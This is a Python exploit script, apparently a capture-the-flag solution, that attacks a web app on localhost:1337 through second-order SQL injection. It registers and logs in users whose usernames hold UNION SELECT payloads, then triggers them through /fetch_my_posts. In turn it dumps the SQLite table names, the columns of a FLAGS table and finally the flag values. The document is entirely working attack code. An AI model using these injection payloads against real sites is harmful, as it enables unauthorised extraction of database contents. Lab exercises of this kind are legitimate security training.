import requests
import sys
from html.parser import HTMLParser



class MyHTMLParser(HTMLParser):
    capture = False
    def handle_starttag(self, tag, attrs):
        
        if(tag == "h2"):
            self.capture = True
        else:
            self.capture = False
        
         
    def handle_data(self,data):
        
        if(self.capture == True):
            fields = []
            fields = data.split(": ")
            print("    " + fields[1])
            self.capture = False





### schema phase ###


url = "http://localhost:1337/register"
data = {
    "username":"hej' union all select 1, tbl_name from sqlite_schema; --",
    "password": "solve"
    }


print("regestering schema dumping user...")
response = requests.post(url,data=data)
if(response.history[0].status_code == 302):
    print("  schema dumping user registered!")
else:
    print("  schema dumping user not registered! aborting...")
    sys.exit()

url = "http://localhost:1337/login"
data = {
    "username":"hej' union all select 1, tbl_name from sqlite_schema; --",
    "password": "solve"
    }

print("logging into website with schema dumping user...")
response = requests.post(url,data=data)
if(response.history[0].status_code == 302):
    print("  logged in!")
else:
    ("  login failed! aborting....")
    sys.exit()
    

url = "http://localhost:1337/fetch_my_posts"
data = {}
print("triggering injection...")
response = requests.get(url,data=data)
if(response.status_code == 200):
    print("  injection triggered correct, parsing database schema...")
    parser = MyHTMLParser()
    parser.feed(response.text)
else:
    print("  injection did not trigger correctly! aborting...")
    sys.exit()  




url = "http://localhost:1337/logout"
data = {}

print("logging out...")
response = requests.get(url,data=data)
if(response.history[0].status_code == 302):
    print("  logged out successfully")
else:
    print("  did not logout successfully! aborting...")
    sys.exit()

### FLAG table phase ###

url = "http://localhost:1337/register"
data = {
    "username":"hej' union all select 1, name from PRAGMA_TABLE_INFO('FLAGS'); --",
    "password": "solve"
    }


print("regestering table structure dumping user...")
response = requests.post(url,data=data)
if(response.history[0].status_code == 302):
    print("  table structure dumping user registered!")
else:
    print("  table structure dumping user not registered! aborting...")
    sys.exit()
    

url = "http://localhost:1337/login"
data = {
    "username":"hej' union all select 1, name from PRAGMA_TABLE_INFO('FLAGS'); --",
    "password": "solve"
    }

print("logging into website with table structure dumping user...")
response = requests.post(url,data=data)
if(response.history[0].status_code == 302):
    print("  logged in!")
else:
    ("  login failed! aborting....")
    sys.exit()
    

url = "http://localhost:1337/fetch_my_posts"
data = {}
print("triggering injection...")
response = requests.get(url,data=data)
if(response.status_code == 200):
    print("  injection triggered correct, parsing FLAGS table structure...")
    parser = MyHTMLParser()
    parser.feed(response.text)
else:
    print("  injection did not trigger correctly! aborting...")
    sys.exit()  


url = "http://localhost:1337/logout"
data = {}

print("logging out...")
response = requests.get(url,data=data)
if(response.history[0].status_code == 302):
    print("  logged out successfully")
else:
    print("  did not logout successfully! aborting...")
    sys.exit()




### FLAG dumping phase ###

url = "http://localhost:1337/register"
data = {
    "username":"hej' union all select 1,flag from flags; --",
    "password": "solve"
    }


print("regestering flag dumping user...")
response = requests.post(url,data=data)
if(response.history[0].status_code == 302):
    print("  flag dumping user registered!")
else:
    print("  flag dumping user not registered! aborting...")
    sys.exit()
    

url = "http://localhost:1337/login"
data = {
    "username":"hej' union all select 1,flag from flags; --",
    "password": "solve"
    }

print("logging into website with flag dumping user...")
response = requests.post(url,data=data)
if(response.history[0].status_code == 302):
    print("  logged in!")
else:
    ("  login failed! aborting....")
    sys.exit()
    

url = "http://localhost:1337/fetch_my_posts"
data = {}
print("triggering injection...")
response = requests.get(url,data=data)
if(response.status_code == 200):
    print("  injection triggered correct, parsing FLAGS...")
    parser = MyHTMLParser()
    parser.feed(response.text)
else:
    print("  injection did not trigger correctly! aborting...")
    sys.exit()  


url = "http://localhost:1337/logout"
data = {}

print("logging out...")
response = requests.get(url,data=data)
if(response.history[0].status_code == 302):
    print("  logged out successfully")
else:
    print("  did not logout successfully! aborting...")
    sys.exit()
